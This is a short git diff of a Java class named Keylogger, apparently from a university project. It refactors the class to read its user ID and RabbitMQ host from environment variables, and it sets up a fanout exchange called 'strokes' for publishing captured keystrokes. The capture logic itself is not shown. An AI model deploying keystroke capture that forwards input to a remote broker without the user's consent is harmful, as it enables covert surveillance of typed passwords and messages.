@@ -12,16 +12,18 @@ import com.rabbitmq.client.Channel;
 import com.rabbitmq.client.Connection;
 import com.rabbitmq.client.ConnectionFactory;
 
-public class Keylogger implements NativeKeyListener{
-  private final String EXCHANGE_NAME = "strokes";
-  private final Long id;
-  private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
-  private Channel channel; 
+import io.github.cdimascio.dotenv.Dotenv;
 
-  public Keylogger(Long id) throws Exception{
-    this.id = id;
+public class Keylogger implements NativeKeyListener{
+  private Dotenv dotenv = Dotenv.load();
+  private Channel channel; 
+  private final String EXCHANGE_NAME = "strokes";
+  private final Long id = Long.parseLong(dotenv.get("USER_ID"));
+  private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
+
+  public Keylogger() throws Exception{
     ConnectionFactory factory = new ConnectionFactory();
-    factory.setHost("deti-ies-16.ua.pt");
+    factory.setHost(dotenv.get("RABBITMQ_HOST"));
     Connection connection = factory.newConnection();
     channel = connection.createChannel();
     channel.exchangeDeclare(EXCHANGE_NAME, "fanout");
